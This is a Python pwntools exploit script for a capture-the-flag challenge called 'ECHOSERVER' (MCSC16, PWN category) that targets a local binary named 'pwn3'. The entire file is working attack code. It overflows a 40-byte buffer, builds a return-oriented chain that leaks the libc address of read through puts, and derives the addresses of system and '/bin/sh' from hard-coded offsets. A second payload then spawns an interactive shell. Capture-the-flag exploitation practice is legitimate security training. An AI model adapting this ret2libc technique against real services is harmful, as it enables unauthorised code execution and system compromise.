#!/usr/bin/python


#ECHOSERVER - MCSC16
#Category**: PWN 
#Points**: 350 
#Author : Abdeljalil Nouiri

from pwn import *
import socket
import time

#context.log_level='debug'

BIN = ELF('./pwn3')

puts_plt = p64(BIN.symbols['puts'])
read_got = p64(BIN.got['read'])
poprdi = p64(0x0000000000400623)
main = p64(0x0040057d)
diffsys = 0xa5110
diffsh = 0x91223 

con = process('./pwn3')

pld = "A"*40
pld += poprdi
pld += read_got
pld += puts_plt
pld += main

con.send(pld)
time.sleep(1)
recv = con.recv()
r = recv.split("\n")
built = (r[1]+'\x00'*2)
leaked = u64(built)

log.info("READ ADDR : " + hex(leaked))

system = leaked - diffsys
bin_sh = leaked + diffsh

log.info("System ADDR : " + hex(system))
log.info("bash ADDR : " + hex(bin_sh))


pld = "A"*40
pld += poprdi
pld += p64(bin_sh)
pld += p64(system)

con.send(pld)
time.sleep(1)
con.interactive("\npwned$ ")